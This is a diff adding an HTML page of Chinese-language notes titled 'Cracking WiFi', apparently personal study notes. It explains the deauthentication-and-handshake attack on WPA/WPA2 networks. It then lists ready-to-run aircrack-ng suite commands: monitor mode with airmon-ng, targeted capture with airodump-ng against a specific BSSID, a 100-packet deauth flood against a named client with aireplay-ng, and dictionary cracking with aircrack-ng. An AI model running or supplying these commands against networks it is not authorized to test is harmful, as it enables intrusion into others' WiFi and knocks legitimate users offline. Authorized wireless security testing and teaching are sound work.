@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>破解WiFi</h1>
+    <hr color="red">
+    <p>
+        <h3>原理</h3>
+        <ul>
+            <li>监听AP（路由器）</li>
+            <li>强制断开连接</li>
+            <li>抓客户端连接时的报文</li>
+            <li>用密码本破解报文</li>
+            
+        </ul>
+    </p>
+    <hr color="blue" width="600" align="left">
+    <h3>知识点</h3>
+    <p>
+        <ol>
+            <li>AP:无线接入点（一般为路由器）</li>
+            <li>SSID：AP的名称 <br>ESSID：拓展AP <br>BSSID：AP的唯一标识符（站点的MAC地址）</li>
+            <li>无线安全协议<br>
+            <ul>
+                <li>WEP：最初的安全协议，十分不安全</li>
+                <li>WPA：较为安全</li>
+                <li>WPA2-PSK：更加安全，初企业外广泛使用</li>
+            </ul>
+            </li>
+            <li>WiFi模式<br>
+            <ul>
+                <li>managed：可加入AP</li>
+                <li>master：可加入或充当AP</li>
+                <li>monitor：破解时使用，可监听可访问所有经过你的无线流量</li>
+            </ul>
+            </li>
+            
+        </ol>
+    </p>
+    <hr color="blue" width="600" align="left">
+    <p>
+        <h3>常用命令</h3>
+        <ol>
+            <li>ifconfig：查看网卡信息（-a，可查看所有网卡）</li>
+            <li>iwconfig：查看无线网卡信息</li>
+            <li>iwlist “网卡（wlan0）” scan：扫描可连接的AP</li>
+            <li>nmcli：图形化网络管理器，（先“systemctl start NetworkManager”开启网络管理器）</li>
+            <li>iw list：“查看无线网卡支持的模式”<br>“aireplay-ng -9 wlan0”命令查看无线网卡是否支持数据包注入功能</li>
+        </ol>
+    </p>
+    <hr color="blue" width="600" align="left">
+    <p>
+        <h3>工具：<br>1.aircrack-ng（kali已自带）<br>2.一块能支持monitor模式和无限注入的网卡 </h3>
+    </p>
+    <hr color="blue" width="600" align="left">
+    <p>
+        <h3>实际操作</h3>
+        <ol>
+            <li>获取目标AP的MAC地址 <br>客户端的MAC地址（BSSID）
+                <br>以及AP正在运行的信道 <br>
+                方法：“iwlist wlan0 scanning”或“nmcli dev wifi”可获得SSID，BSSID，信道<br>ESSID</li>
+            <li>用“airmon-ng start wlan0”命令开启无线网卡的monitor模式（此时网卡会被重命名）</li>
+            <li>用“airodump-ng wlan0mon”可获取广播AP和附近客户端的关键数据<br>
+            修饰一下“airodump-ng -c 6（信道） --bssid 88：c3：97：c2：F1：4E wlan0mon”可获得指定AP的指定信道的关键信息（可以获取客户端的MAC地址）<br>
+        再修饰一下“airodump-ng -c 6 --bssid 88：c3：97：c2：F1：4E -w Hacker wlan0mon”能保存指定AP的报文</li>
+            <li>用“aireplay-ng --deauth 100 -a 88：c3：97：c2：F1：4E -c A0:A3:E3:44:7C:E5 wlan0mon”命令断开客户机与AP的链接</li>
+            <li>用airedump命令抓取报文（打开另一个终端，保持上一个终端抓包开启）</li>
+            <li>使用字典破解报文<br>
+                用“cat  >>password.lst 《EOF”建立字典文件<br>
+            aircrack-ng -w wordlist.dic（字典文件） -b 88：c3：97：c2：F1：4E（AP的MAC地址） Hacker.cap</li>
+            <li>字典中要有可能的密码 </li>
+            <li><h2>破解成功</h2></li>
+        </ol>
+        <img src="QQ截图20211207150815.png" alt="why">
+    </p>
+</body>
+</html>
